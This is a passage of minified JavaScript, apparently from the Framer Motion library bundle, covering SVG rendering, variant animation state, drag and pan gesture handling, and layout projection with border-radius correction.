e.attrs)t.setAttribute(rb.has(i)?i:tg(i),e.attrs[i])}class hO extends tb{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1,this.measureInstanceViewportBox=ke}getBaseTargetFromProps(e,n){return e[n]}readValueFromInstance(e,n){if(Bs.has(n)){const r=Mk(n);return r&&r.default||0}return n=rb.has(n)?n:tg(n),e.getAttribute(n)}scrapeMotionValuesFromProps(e,n,r){return Kk(e,n,r)}build(e,n,r){$k(e,n,this.isSVGTag,r.transformTemplate,r.style)}renderInstance(e,n,r,i){fO(e,n,r,i)}mount(e){this.isSVGTag=Uk(e.tagName),super.mount(e)}}const pO=(t,e)=>Xm(t)?new hO(e):new dO(e,{allowProjection:t!==S.Fragment});function us(t,e,n){const r=t.getProps();return Zm(r,e,n!==void 0?n:r.custom,t)}const Fh=t=>Array.isArray(t);function mO(t,e,n){t.hasValue(e)?t.getValue(e).set(n):t.addValue(e,ws(n))}function gO(t){return Fh(t)?t[t.length-1]||0:t}function yO(t,e){const n=us(t,e);let{transitionEnd:r={},transition:i={},...s}=n||{};s={...s,...r};for(const o in s){const a=gO(s[o]);mO(t,o,a)}}function xO(t){return!!(et(t)&&t.add)}function Bh(t,e){const n=t.getValue("willChange");if(xO(n))return n.add(e);if(!n&&qn.WillChange){const r=new qn.WillChange("auto");t.addValue("willChange",r),r.add(e)}}function ib(t){return t.props[qk]}const vO=t=>t!==null;function wO(t,{repeat:e,repeatType:n="loop"},r){const i=t.filter(vO),s=e&&n!=="loop"&&e%2===1?0:i.length-1;return!s||r===void 0?i[s]:r}const SO={type:"spring",stiffness:500,damping:25,restSpeed:10},kO=t=>({type:"spring",stiffness:550,damping:t===0?2*Math.sqrt(550):30,restSpeed:10}),bO={type:"keyframes",duration:.8},CO={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},EO=(t,{keyframes:e})=>e.length>2?bO:Bs.has(t)?t.startsWith("scale")?kO(e[1]):SO:CO;function TO({when:t,delay:e,delayChildren:n,staggerChildren:r,staggerDirection:i,repeat:s,repeatType:o,repeatDelay:a,from:l,elapsed:u,...c}){return!!Object.keys(c).length}const ng=(t,e,n,r={},i,s)=>o=>{const a=Hm(r,t)||{},l=a.delay||r.delay||0;let{elapsed:u=0}=r;u=u-vn(l);const c={keyframes:Array.isArray(n)?n:[null,n],ease:"easeOut",velocity:e.getVelocity(),...a,delay:-u,onUpdate:f=>{e.set(f),a.onUpdate&&a.onUpdate(f)},onComplete:()=>{o(),a.onComplete&&a.onComplete()},name:t,motionValue:e,element:s?void 0:i};TO(a)||Object.assign(c,EO(t,c)),c.duration&&(c.duration=vn(c.duration)),c.repeatDelay&&(c.repeatDelay=vn(c.repeatDelay)),c.from!==void 0&&(c.keyframes[0]=c.from);let d=!1;if((c.type===!1||c.duration===0&&!c.repeatDelay)&&(Oh(c),c.delay===0&&(d=!0)),(qn.instantAnimations||qn.skipAnimations)&&(d=!0,Oh(c),c.delay=0),c.allowFlatten=!a.type&&!a.ease,d&&!s&&e.get()!==void 0){const f=wO(c.keyframes,a);if(f!==void 0){oe.update(()=>{c.onUpdate(f),c.onComplete()});return}}return a.isSync?new _m(c):new JP(c)};function MO({protectedKeys:t,needsAnimating:e},n){const r=t.hasOwnProperty(n)&&e[n]!==!0;return e[n]=!1,r}function sb(t,e,{delay:n=0,transitionOverride:r,type:i}={}){let{transition:s=t.getDefaultTransition(),transitionEnd:o,...a}=e;r&&(s=r);const l=[],u=i&&t.animationState&&t.animationState.getState()[i];for(const c in a){const d=t.getValue(c,t.latestValues[c]??null),f=a[c];if(f===void 0||u&&MO(u,c))continue;const h={delay:n,...Hm(s||{},c)},p=d.get();if(p!==void 0&&!d.isAnimating&&!Array.isArray(f)&&f===p&&!h.velocity)continue;let y=!1;if(window.MotionHandoffAnimation){const g=ib(t);if(g){const v=window.MotionHandoffAnimation(g,c,oe);v!==null&&(h.startTime=v,y=!0)}}Bh(t,c),d.start(ng(c,d,f,t.shouldReduceMotion&&Ck.has(c)?{type:!1}:h,t,y));const x=d.animation;x&&l.push(x)}return o&&Promise.all(l).then(()=>{oe.update(()=>{o&&yO(t,o)})}),l}function ob(t,e,n,r=0,i=1){const s=Array.from(t).sort((u,c)=>u.sortNodePosition(c)).indexOf(e),o=t.size,a=(o-1)*r;return typeof n=="function"?n(s,o):i===1?s*r:a-s*r}function Vh(t,e,n={}){var l;const r=us(t,e,n.type==="exit"?(l=t.presenceContext)==null?void 0:l.custom:void 0);let{transition:i=t.getDefaultTransition()||{}}=r||{};n.transitionOverride&&(i=n.transitionOverride);const s=r?()=>Promise.all(sb(t,r,n)):()=>Promise.resolve(),o=t.variantChildren&&t.variantChildren.size?(u=0)=>{const{delayChildren:c=0,staggerChildren:d,staggerDirection:f}=i;return NO(t,e,u,c,d,f,n)}:()=>Promise.resolve(),{when:a}=i;if(a){const[u,c]=a==="beforeChildren"?[s,o]:[o,s];return u().then(()=>c())}else return Promise.all([s(),o(n.delay)])}function NO(t,e,n=0,r=0,i=0,s=1,o){const a=[];for(const l of t.variantChildren)l.notify("AnimationStart",e),a.push(Vh(l,e,{...o,delay:n+(typeof r=="function"?0:r)+ob(t.variantChildren,l,r,i,s)}).then(()=>l.notify("AnimationComplete",e)));return Promise.all(a)}function AO(t,e,n={}){t.notify("AnimationStart",e);let r;if(Array.isArray(e)){const i=e.map(s=>Vh(t,s,n));r=Promise.all(i)}else if(typeof e=="string")r=Vh(t,e,n);else{const i=typeof e=="function"?us(t,e,n.custom):e;r=Promise.all(sb(t,i,n))}return r.then(()=>{t.notify("AnimationComplete",e)})}function ab(t,e){if(!Array.isArray(e))return!1;const n=e.length;if(n!==t.length)return!1;for(let r=0;r<n;r++)if(e[r]!==t[r])return!1;return!0}const PO=Jm.length;function lb(t){if(!t)return;if(!t.isControllingVariants){const n=t.parent?lb(t.parent)||{}:{};return t.props.initial!==void 0&&(n.initial=t.props.initial),n}const e={};for(let n=0;n<PO;n++){const r=Jm[n],i=t.props[r];(ia(i)||i===!1)&&(e[r]=i)}return e}const RO=[...Gm].reverse(),OO=Gm.length;function DO(t){return e=>Promise.all(e.map(({animation:n,options:r})=>AO(t,n,r)))}function LO(t){let e=DO(t),n=W0(),r=!0;const i=l=>(u,c)=>{var f;const d=us(t,c,l==="exit"?(f=t.presenceContext)==null?void 0:f.custom:void 0);if(d){const{transition:h,transitionEnd:p,...y}=d;u={...u,...y,...p}}return u};function s(l){e=l(t)}function o(l){const{props:u}=t,c=lb(t.parent)||{},d=[],f=new Set;let h={},p=1/0;for(let x=0;x<OO;x++){const g=RO[x],v=n[g],w=u[g]!==void 0?u[g]:c[g],b=ia(w),k=g===l?v.isActive:null;k===!1&&(p=x);let E=w===c[g]&&w!==u[g]&&b;if(E&&r&&t.manuallyAnimateOnMount&&(E=!1),v.protectedKeys={...h},!v.isActive&&k===null||!w&&!v.prevProp||Ic(w)||typeof w=="boolean")continue;const M=IO(v.prevProp,w);let C=M||g===l&&v.isActive&&!E&&b||x>p&&b,N=!1;const O=Array.isArray(w)?w:[w];let H=O.reduce(i(g),{});k===!1&&(H={});const{prevResolvedValues:pe={}}=v,Pe={...pe,...H},bt=J=>{C=!0,f.has(J)&&(N=!0,f.delete(J)),v.needsAnimating[J]=!0;const D=t.getValue(J);D&&(D.liveStyle=!1)};for(const J in Pe){const D=H[J],B=pe[J];if(h.hasOwnProperty(J))continue;let z=!1;Fh(D)&&Fh(B)?z=!ab(D,B):z=D!==B,z?D!=null?bt(J):f.add(J):D!==void 0&&f.has(J)?bt(J):v.protectedKeys[J]=!0}v.prevProp=w,v.prevResolvedValues=H,v.isActive&&(h={...h,...H}),r&&t.blockInitialAnimation&&(C=!1);const Ct=E&&M;C&&(!Ct||N)&&d.push(...O.map(J=>{const D={type:g};if(typeof J=="string"&&r&&!Ct&&t.manuallyAnimateOnMount&&t.parent){const{parent:B}=t,z=us(B,J);if(B.enteringChildren&&z){const{delayChildren:Y}=z.transition||{};D.delay=ob(B.enteringChildren,t,Y)}}return{animation:J,options:D}}))}if(f.size){const x={};if(typeof u.initial!="boolean"){const g=us(t,Array.isArray(u.initial)?u.initial[0]:u.initial);g&&g.transition&&(x.transition=g.transition)}f.forEach(g=>{const v=t.getBaseTarget(g),w=t.getValue(g);w&&(w.liveStyle=!0),x[g]=v??null}),d.push({animation:x})}let y=!!d.length;return r&&(u.initial===!1||u.initial===u.animate)&&!t.manuallyAnimateOnMount&&(y=!1),r=!1,y?e(d):Promise.resolve()}function a(l,u){var d;if(n[l].isActive===u)return Promise.resolve();(d=t.variantChildren)==null||d.forEach(f=>{var h;return(h=f.animationState)==null?void 0:h.setActive(l,u)}),n[l].isActive=u;const c=o(l);for(const f in n)n[f].protectedKeys={};return c}return{animateChanges:o,setActive:a,setAnimateFunction:s,getState:()=>n,reset:()=>{n=W0(),r=!0}}}function IO(t,e){return typeof e=="string"?e!==t:Array.isArray(e)?!ab(e,t):!1}function $r(t=!1){return{isActive:t,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function W0(){return{animate:$r(!0),whileInView:$r(),whileHover:$r(),whileTap:$r(),whileDrag:$r(),whileFocus:$r(),exit:$r()}}class Br{constructor(e){this.isMounted=!1,this.node=e}update(){}}class jO extends Br{constructor(e){super(e),e.animationState||(e.animationState=LO(e))}updateAnimationControlsSubscription(){const{animate:e}=this.node.getProps();Ic(e)&&(this.unmountControls=e.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:e}=this.node.getProps(),{animate:n}=this.node.prevProps||{};e!==n&&this.updateAnimationControlsSubscription()}unmount(){var e;this.node.animationState.reset(),(e=this.unmountControls)==null||e.call(this)}}let FO=0;class BO extends Br{constructor(){super(...arguments),this.id=FO++}update(){if(!this.node.presenceContext)return;const{isPresent:e,onExitComplete:n}=this.node.presenceContext,{isPresent:r}=this.node.prevPresenceContext||{};if(!this.node.animationState||e===r)return;const i=this.node.animationState.setActive("exit",!e);n&&!e&&i.then(()=>{n(this.id)})}mount(){const{register:e,onExitComplete:n}=this.node.presenceContext||{};n&&n(this.id),e&&(this.unmount=e(this.id))}unmount(){}}const VO={animation:{Feature:jO},exit:{Feature:BO}};function oa(t,e,n,r={passive:!0}){return t.addEventListener(e,n,r),()=>t.removeEventListener(e,n)}function Oa(t){return{point:{x:t.pageX,y:t.pageY}}}const zO=t=>e=>Km(e)&&t(e,Oa(e));function Co(t,e,n,r){return oa(t,e,zO(n),r)}const ub=1e-4,_O=1-ub,$O=1+ub,cb=.01,HO=0-cb,UO=0+cb;function st(t){return t.max-t.min}function WO(t,e,n){return Math.abs(t-e)<=n}function K0(t,e,n,r=.5){t.origin=r,t.originPoint=ce(e.min,e.max,t.origin),t.scale=st(n)/st(e),t.translate=ce(n.min,n.max,t.origin)-t.originPoint,(t.scale>=_O&&t.scale<=$O||isNaN(t.scale))&&(t.scale=1),(t.translate>=HO&&t.translate<=UO||isNaN(t.translate))&&(t.translate=0)}function Eo(t,e,n,r){K0(t.x,e.x,n.x,r?r.originX:void 0),K0(t.y,e.y,n.y,r?r.originY:void 0)}function q0(t,e,n){t.min=n.min+e.min,t.max=t.min+st(e)}function KO(t,e,n){q0(t.x,e.x,n.x),q0(t.y,e.y,n.y)}function G0(t,e,n){t.min=e.min-n.min,t.max=t.min+st(e)}function To(t,e,n){G0(t.x,e.x,n.x),G0(t.y,e.y,n.y)}function It(t){return[t("x"),t("y")]}const db=({current:t})=>t?t.ownerDocument.defaultView:null,J0=(t,e)=>Math.abs(t-e);function qO(t,e){const n=J0(t.x,e.x),r=J0(t.y,e.y);return Math.sqrt(n**2+r**2)}class fb{constructor(e,n,{transformPagePoint:r,contextWindow:i=window,dragSnapToOrigin:s=!1,distanceThreshold:o=3}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const f=Hd(this.lastMoveEventInfo,this.history),h=this.startEvent!==null,p=qO(f.offset,{x:0,y:0})>=this.distanceThreshold;if(!h&&!p)return;const{point:y}=f,{timestamp:x}=He;this.history.push({...y,timestamp:x});const{onStart:g,onMove:v}=this.handlers;h||(g&&g(this.lastMoveEvent,f),this.startEvent=this.lastMoveEvent),v&&v(this.lastMoveEvent,f)},this.handlePointerMove=(f,h)=>{this.lastMoveEvent=f,this.lastMoveEventInfo=$d(h,this.transformPagePoint),oe.update(this.updatePoint,!0)},this.handlePointerUp=(f,h)=>{this.end();const{onEnd:p,onSessionEnd:y,resumeAnimation:x}=this.handlers;if(this.dragSnapToOrigin&&x&&x(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const g=Hd(f.type==="pointercancel"?this.lastMoveEventInfo:$d(h,this.transformPagePoint),this.history);this.startEvent&&p&&p(f,g),y&&y(f,g)},!Km(e))return;this.dragSnapToOrigin=s,this.handlers=n,this.transformPagePoint=r,this.distanceThreshold=o,this.contextWindow=i||window;const a=Oa(e),l=$d(a,this.transformPagePoint),{point:u}=l,{timestamp:c}=He;this.history=[{...u,timestamp:c}];const{onSessionStart:d}=n;d&&d(e,Hd(l,this.history)),this.removeListeners=Aa(Co(this.contextWindow,"pointermove",this.handlePointerMove),Co(this.contextWindow,"pointerup",this.handlePointerUp),Co(this.contextWindow,"pointercancel",this.handlePointerUp))}updateHandlers(e){this.handlers=e}end(){this.removeListeners&&this.removeListeners(),Rr(this.updatePoint)}}function $d(t,e){return e?{point:e(t.point)}:t}function Y0(t,e){return{x:t.x-e.x,y:t.y-e.y}}function Hd({point:t},e){return{point:t,delta:Y0(t,hb(e)),offset:Y0(t,GO(e)),velocity:JO(e,.1)}}function GO(t){return t[0]}function hb(t){return t[t.length-1]}function JO(t,e){if(t.length<2)return{x:0,y:0};let n=t.length-1,r=null;const i=hb(t);for(;n>=0&&(r=t[n],!(i.timestamp-r.timestamp>vn(e)));)n--;if(!r)return{x:0,y:0};const s=wn(i.timestamp-r.timestamp);if(s===0)return{x:0,y:0};const o={x:(i.x-r.x)/s,y:(i.y-r.y)/s};return o.x===1/0&&(o.x=0),o.y===1/0&&(o.y=0),o}function YO(t,{min:e,max:n},r){return e!==void 0&&t<e?t=r?ce(e,t,r.min):Math.max(t,e):n!==void 0&&t>n&&(t=r?ce(n,t,r.max):Math.min(t,n)),t}function Q0(t,e,n){return{min:e!==void 0?t.min+e:void 0,max:n!==void 0?t.max+n-(t.max-t.min):void 0}}function QO(t,{top:e,left:n,bottom:r,right:i}){return{x:Q0(t.x,n,i),y:Q0(t.y,e,r)}}function X0(t,e){let n=e.min-t.min,r=e.max-t.max;return e.max-e.min<t.max-t.min&&([n,r]=[r,n]),{min:n,max:r}}function XO(t,e){return{x:X0(t.x,e.x),y:X0(t.y,e.y)}}function ZO(t,e){let n=.5;const r=st(t),i=st(e);return i>r?n=ta(e.min,e.max-r,t.min):r>i&&(n=ta(t.min,t.max-i,e.min)),Kn(0,1,n)}function eD(t,e){const n={};return e.min!==void 0&&(n.min=e.min-t.min),e.max!==void 0&&(n.max=e.max-t.min),n}const zh=.35;function tD(t=zh){return t===!1?t=0:t===!0&&(t=zh),{x:Z0(t,"left","right"),y:Z0(t,"top","bottom")}}function Z0(t,e,n){return{min:ex(t,e),max:ex(t,n)}}function ex(t,e){return typeof t=="number"?t:t[e]||0}const nD=new WeakMap;class rD{constructor(e){this.openDragLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=ke(),this.latestPointerEvent=null,this.latestPanInfo=null,this.visualElement=e}start(e,{snapToCursor:n=!1,distanceThreshold:r}={}){const{presenceContext:i}=this.visualElement;if(i&&i.isPresent===!1)return;const s=d=>{const{dragSnapToOrigin:f}=this.getProps();f?this.pauseAnimation():this.stopAnimation(),n&&this.snapToCursor(Oa(d).point)},o=(d,f)=>{const{drag:h,dragPropagation:p,onDragStart:y}=this.getProps();if(h&&!p&&(this.openDragLock&&this.openDragLock(),this.openDragLock=dR(h),!this.openDragLock))return;this.latestPointerEvent=d,this.latestPanInfo=f,this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),It(g=>{let v=this.getAxisMotionValue(g).get()||0;if(Sn.test(v)){const{projection:w}=this.visualElement;if(w&&w.layout){const b=w.layout.layoutBox[g];b&&(v=st(b)*(parseFloat(v)/100))}}this.originPoint[g]=v}),y&&oe.postRender(()=>y(d,f)),Bh(this.visualElement,"transform");const{animationState:x}=this.visualElement;x&&x.setActive("whileDrag",!0)},a=(d,f)=>{this.latestPointerEvent=d,this.latestPanInfo=f;const{dragPropagation:h,dragDirectionLock:p,onDirectionLock:y,onDrag:x}=this.getProps();if(!h&&!this.openDragLock)return;const{offset:g}=f;if(p&&this.currentDirection===null){this.currentDirection=iD(g),this.currentDirection!==null&&y&&y(this.currentDirection);return}this.updateAxis("x",f.point,g),this.updateAxis("y",f.point,g),this.visualElement.render(),x&&x(d,f)},l=(d,f)=>{this.latestPointerEvent=d,this.latestPanInfo=f,this.stop(d,f),this.latestPointerEvent=null,this.latestPanInfo=null},u=()=>It(d=>{var f;return this.getAnimationState(d)==="paused"&&((f=this.getAxisMotionValue(d).animation)==null?void 0:f.play())}),{dragSnapToOrigin:c}=this.getProps();this.panSession=new fb(e,{onSessionStart:s,onStart:o,onMove:a,onSessionEnd:l,resumeAnimation:u},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:c,distanceThreshold:r,contextWindow:db(this.visualElement)})}stop(e,n){const r=e||this.latestPointerEvent,i=n||this.latestPanInfo,s=this.isDragging;if(this.cancel(),!s||!i||!r)return;const{velocity:o}=i;this.startAnimation(o);const{onDragEnd:a}=this.getProps();a&&oe.postRender(()=>a(r,i))}cancel(){this.isDragging=!1;const{projection:e,animationState:n}=this.visualElement;e&&(e.isAnimationBlocked=!1),this.panSession&&this.panSession.end(),this.panSession=void 0;const{dragPropagation:r}=this.getProps();!r&&this.openDragLock&&(this.openDragLock(),this.openDragLock=null),n&&n.setActive("whileDrag",!1)}updateAxis(e,n,r){const{drag:i}=this.getProps();if(!r||!cl(e,i,this.currentDirection))return;const s=this.getAxisMotionValue(e);let o=this.originPoint[e]+r[e];this.constraints&&this.constraints[e]&&(o=YO(o,this.constraints[e],this.elastic[e])),s.set(o)}resolveConstraints(){var s;const{dragConstraints:e,dragElastic:n}=this.getProps(),r=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(s=this.visualElement.projection)==null?void 0:s.layout,i=this.constraints;e&&Qi(e)?this.constraints||(this.constraints=this.resolveRefConstraints()):e&&r?this.constraints=QO(r.layoutBox,e):this.constraints=!1,this.elastic=tD(n),i!==this.constraints&&r&&this.constraints&&!this.hasMutatedConstraints&&It(o=>{this.constraints!==!1&&this.getAxisMotionValue(o)&&(this.constraints[o]=eD(r.layoutBox[o],this.constraints[o]))})}resolveRefConstraints(){const{dragConstraints:e,onMeasureDragConstraints:n}=this.getProps();if(!e||!Qi(e))return!1;const r=e.current,{projection:i}=this.visualElement;if(!i||!i.layout)return!1;const s=sO(r,i.root,this.visualElement.getTransformPagePoint());let o=XO(i.layout.layoutBox,s);if(n){const a=n(nO(o));this.hasMutatedConstraints=!!a,a&&(o=Yk(a))}return o}startAnimation(e){const{drag:n,dragMomentum:r,dragElastic:i,dragTransition:s,dragSnapToOrigin:o,onDragTransitionEnd:a}=this.getProps(),l=this.constraints||{},u=It(c=>{if(!cl(c,n,this.currentDirection))return;let d=l&&l[c]||{};o&&(d={min:0,max:0});const f=i?200:1e6,h=i?40:1e7,p={type:"inertia",velocity:r?e[c]:0,bounceStiffness:f,bounceDamping:h,timeConstant:750,restDelta:1,restSpeed:10,...s,...d};return this.startAxisValueAnimation(c,p)});return Promise.all(u).then(a)}startAxisValueAnimation(e,n){const r=this.getAxisMotionValue(e);return Bh(this.visualElement,e),r.start(ng(e,r,0,n,this.visualElement,!1))}stopAnimation(){It(e=>this.getAxisMotionValue(e).stop())}pauseAnimation(){It(e=>{var n;return(n=this.getAxisMotionValue(e).animation)==null?void 0:n.pause()})}getAnimationState(e){var n;return(n=this.getAxisMotionValue(e).animation)==null?void 0:n.state}getAxisMotionValue(e){const n=`_drag${e.toUpperCase()}`,r=this.visualElement.getProps(),i=r[n];return i||this.visualElement.getValue(e,(r.initial?r.initial[e]:void 0)||0)}snapToCursor(e){It(n=>{const{drag:r}=this.getProps();if(!cl(n,r,this.currentDirection))return;const{projection:i}=this.visualElement,s=this.getAxisMotionValue(n);if(i&&i.layout){const{min:o,max:a}=i.layout.layoutBox[n];s.set(e[n]-ce(o,a,.5))}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:e,dragConstraints:n}=this.getProps(),{projection:r}=this.visualElement;if(!Qi(n)||!r||!this.constraints)return;this.stopAnimation();const i={x:0,y:0};It(o=>{const a=this.getAxisMotionValue(o);if(a&&this.constraints!==!1){const l=a.get();i[o]=ZO({min:l,max:l},this.constraints[o])}});const{transformTemplate:s}=this.visualElement.getProps();this.visualElement.current.style.transform=s?s({},""):"none",r.root&&r.root.updateScroll(),r.updateLayout(),this.resolveConstraints(),It(o=>{if(!cl(o,e,null))return;const a=this.getAxisMotionValue(o),{min:l,max:u}=this.constraints[o];a.set(ce(l,u,i[o]))})}addListeners(){if(!this.visualElement.current)return;nD.set(this.visualElement,this);const e=this.visualElement.current,n=Co(e,"pointerdown",l=>{const{drag:u,dragListener:c=!0}=this.getProps();u&&c&&this.start(l)}),r=()=>{const{dragConstraints:l}=this.getProps();Qi(l)&&l.current&&(this.constraints=this.resolveRefConstraints())},{projection:i}=this.visualElement,s=i.addEventListener("measure",r);i&&!i.layout&&(i.root&&i.root.updateScroll(),i.updateLayout()),oe.read(r);const o=oa(window,"resize",()=>this.scalePositionWithinConstraints()),a=i.addEventListener("didUpdate",({delta:l,hasLayoutChanged:u})=>{this.isDragging&&u&&(It(c=>{const d=this.getAxisMotionValue(c);d&&(this.originPoint[c]+=l[c].translate,d.set(d.get()+l[c].translate))}),this.visualElement.render())});return()=>{o(),n(),s(),a&&a()}}getProps(){const e=this.visualElement.getProps(),{drag:n=!1,dragDirectionLock:r=!1,dragPropagation:i=!1,dragConstraints:s=!1,dragElastic:o=zh,dragMomentum:a=!0}=e;return{...e,drag:n,dragDirectionLock:r,dragPropagation:i,dragConstraints:s,dragElastic:o,dragMomentum:a}}}function cl(t,e,n){return(e===!0||e===t)&&(n===null||n===t)}function iD(t,e=10){let n=null;return Math.abs(t.y)>e?n="y":Math.abs(t.x)>e&&(n="x"),n}class sD extends Br{constructor(e){super(e),this.removeGroupControls=Ut,this.removeListeners=Ut,this.controls=new rD(e)}mount(){const{dragControls:e}=this.node.getProps();e&&(this.removeGroupControls=e.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ut}unmount(){this.removeGroupControls(),this.removeListeners()}}const tx=t=>(e,n)=>{t&&oe.postRender(()=>t(e,n))};class oD extends Br{constructor(){super(...arguments),this.removePointerDownListener=Ut}onPointerDown(e){this.session=new fb(e,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:db(this.node)})}createPanHandlers(){const{onPanSessionStart:e,onPanStart:n,onPan:r,onPanEnd:i}=this.node.getProps();return{onSessionStart:tx(e),onStart:tx(n),onMove:r,onEnd:(s,o)=>{delete this.session,i&&oe.postRender(()=>i(s,o))}}}mount(){this.removePointerDownListener=Co(this.node.current,"pointerdown",e=>this.onPointerDown(e))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}const Vl={hasAnimatedSinceResize:!0,hasEverUpdated:!1};function nx(t,e){return e.max===e.min?0:t/(e.max-e.min)*100}const Zs={correct:(t,e)=>{if(!e.target)return t;if(typeof t=="string")if(_.test(t))t=parseFloat(t);else return t;const n=nx(t,e.target.x),r=nx(t,e.target.y);return`${n}% ${r}%`}},aD={correct:(t,{treeScale:e,projectionDelta:n})=>{const r=t,i=Or.parse(t);if(i.length>5)return r;const s=Or.createTransformer(t),o=typeof i[0]!="number"?1:0,a=n.x.scale*e.x,l=n.y.scale*e.y;i[0+o]/=a,i[1+o]/=l;const u=ce(a,l,.5);return typeof i[2+o]=="number"&&(i[2+o]/=u),typeof i[3+o]=="number"&&(i[3+o]/=u),s(i)}};let Ud=!1;class lD extends S.Component{componentDidMount(){const{visualElement:e,layoutGroup:n,switchLayoutGroup:r,layoutId:i}=this.props,{projection:s}=e;PR(uD),s&&(n.group&&n.group.add(s),r&&r.register&&i&&r.register(s),Ud&&s.root.didUpdate(),s.addEventListener("animationComplete",()=>{this.safeToRemove()}),s.setOptions({...s.options,onExitComplete:()=>this.safeToRemove()})),Vl.hasEverUpdated=!0}getSnapshotBeforeUpdate(e){const{layoutDependency:n,visualElement:r,drag:i,isPresent:s}=this.props,{projection:o}=r;return o&&(o.isPresent=s,Ud=!0,i||e.layoutDependency!==n||n===void 0||e.isPresent!==s?o.willUpdate():this.safeToRemove(),e.isPresent!==s&&(s?o.promote():o.relegate()||oe.postRender(()=>{const a=o.getStack();(!a||!a.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:e}=this.props.visualElement;e&&(e.root.didUpdate(),Wm.postRender(()=>{!e.currentAnimation&&e.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:e,layoutGroup:n,switchLayoutGroup:r}=this.props,{projection:i}=e;Ud=!0,i&&(i.scheduleCheckAfterUnmount(),n&&n.group&&n.group.remove(i),r&&r.deregister&&r.deregister(i))}safeToRemove(){const{safeToRemove:e}=this.props;e&&e()}render(){return null}}function pb(t){const[e,n]=Ik(),r=S.useContext(Cm);return m.jsx(lD,{...t,layoutGroup:r,switchLayoutGroup:S.useContext(Gk),isPresent:e,safeToRemove:n})}const uD={borderRadius:{...Zs,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:Zs,borderTopRightRadius:Zs,borderBottomLeftRadius:Zs,borderBottomRightRadius:Zs,boxShadow:aD};function cD(t,e,n){const r=et(t)?t:ws(t);return r.start(ng("",r,e,n)),r.animation}const dD=(t,e)=>t.depth-e.depth;class fD{constructor(){this.children=[],this.isDirty=!1}add(e){Mm(this.children,e),this.isDirty=!0}remove(e){Nm(this.children,e),this.isDirty=!0}forEach(e){this.isDirty&&this.children.sort(dD),this.isDirty=!1,this.children.forEach(e)}}function hD(t,e){const n=gt.now(),r=({timestamp:i})=>{const s=i-n;s>=e&&(Rr(r),t(s-e))};return oe.setup(r,!0),()=>Rr(r)}const mb=["TopLeft","TopRight","BottomLeft","BottomRight"],pD=mb.length,rx=t=>typeof t=="string"?parseFloat(t):t,ix=t=>typeof t=="number"||_.test(t);function mD(t,e,n,r,i,s){i?(t.opacity=ce(0,n.opacity??1,gD(r)),t.opacityExit=ce(e.opacity??1,0,yD(r))):s&&(t.opacity=ce(e.opacity??1,n.opacity??1,r));for(let o=0;o<pD;o++){const a=`border${mb[o]}Radius`;let l=sx(e,a),u=sx(n,a);if(l===void 0&&u===void 0)continue;l||(l=0),u||(u=0),l===0||u===0||ix(l)===ix(u)?(t[a]=Math.max(ce(rx(l),rx(u),r),0),(Sn.test(u)||Sn.test(l))&&(t[a]+="%")):t[a]=u}(e.rotate||n.rotate)&&(t.rotate=ce(e.rotate||0,n.rotate||0,r))}function sx(t,e){return t[e]!==void 0?t[e]:t.borderRadius}const gD=gb(0,.5,tk),yD=gb(.5,.95,Ut);function gb(t,e,n){return r=>r<t?0:r>e?1:n(ta(t,e,r))}function ox(t,e){t.min=e.min,t.max=e.max}function Dt(t,e){ox(t.x,e.x),ox(t.y,e.y)}function ax(t,e){t.translate=e.translate,t.scale=e.scale,t.originPoint=e.originPoint,t.origin=e.origin}function lx(t,e,n,r,i){return t-=e,t=Cu(t,1/n,r),i!==void 0&&(t=Cu(t,1/i,r)),t}function xD(t,e=0,n=1,r=.5,i,s=t,o=t){if(Sn.test(e)&&(e=parseFloat(e),e=ce(o.min,o.max,e/100)-o.min),typeof e!="number")return;let a=ce(s.min,s.max,r);t===s&&(a-=e),t.min=lx(t.min,e,n,a,i),t.max=lx(t.max,e,n,a,i)}function ux(t,e,[n,r,i],s,o){xD(t,e[n],e[r],e[i],e.scale,s,o)}const vD=["x","scaleX","originX"],wD=["y","scaleY","originY"];function cx(t,e,n,r){ux(t.x,e,vD,n?n.x:void 0,r?r.x:void 0),ux(t.y,e,wD,n?n.y:void 0,r?r.y:void 0)}function dx(t){return t.translate===0&&t.scale===1}function yb(t){return dx(t.x)&&dx(t.y)}function fx(t,e){return t.min===e.min&&t.max===e.max}function SD(t,e){return fx(t.x,e.x)&&fx(t.y,e.y)}function hx(t,e){return Math.round(t.min)===Math.round(e.min)&&Math.round(t.max)===Math.round(e.max)}function xb(t,e){return hx(t.x,e.x)&&hx(t.y,e.y)}function px(t){return st(t.x)/st(t.y)}function mx(t,e){return t.translate===e.translate&&t.scale===e.scale&&t.originPoint===e.originPoint}class kD{constructor(){this.members=[]}add(e){Mm(this.members,e),e.scheduleRender()}remove(e){if(Nm(this.members,e),e===this.prevLead&&(this.prevLead=void 0),e===this.lead){const n=this.members[this.members.length-1];n&&this.promote(n)}}relegate(e){const n=this.members.findIndex(i=>e===i);if(n===0)return!1;let r;for(let i=n;i>=0;i--){const s=this.members[i];if(s.isPresent!==!1){r=s;break}}return r?(this.promote(r),!0):!1}promote(e,n){const 